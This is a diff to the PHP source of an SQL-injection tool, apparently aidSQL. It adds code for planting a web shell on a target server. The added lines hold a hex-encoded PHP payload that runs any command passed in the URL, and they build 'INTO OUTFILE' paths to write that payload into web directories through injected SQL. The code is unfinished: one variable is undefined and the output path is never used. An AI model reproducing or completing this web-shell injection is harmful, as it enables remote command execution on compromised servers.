@@ -578,14 +578,14 @@
 					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\disclosure\\DisclosureResult"));
 				}
 
-				$webDirectories	=	$information->getWebDirectories();
-				$unixDirectories	=	$information->getUnixDirectories();
-				$winDirectories	=	$information->getWindowsDirectories();
+				$webDirectories		=	$information->getWebDirectories();
 
-				var_dump($unixDirectories);
-				var_dump($winDirectories);
-				die();
-				
+				array_unshift($webDirectories,"");
+
+				$unixDirectories		=	$information->getUnixDirectories();
+				$winDirectories		=	$information->getWindowsDirectories();
+
+				$shell				=	"0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e";
 
 				if(!sizeof($webDirectories)){
 
@@ -594,9 +594,15 @@
 
 				}
 
-				foreach($directories as $key=>$dir){
+				foreach($webDirectories as $key=>$webDir){
 
 					$this->log("Trying to inject shell in directory \"$dir\"",0,"white");
+
+					foreach($unixDirectories as $unixDir){
+
+						$outfile	=	"INTO OUTFILE $unixDir$webDir";
+
+					}	
 
 				}
 
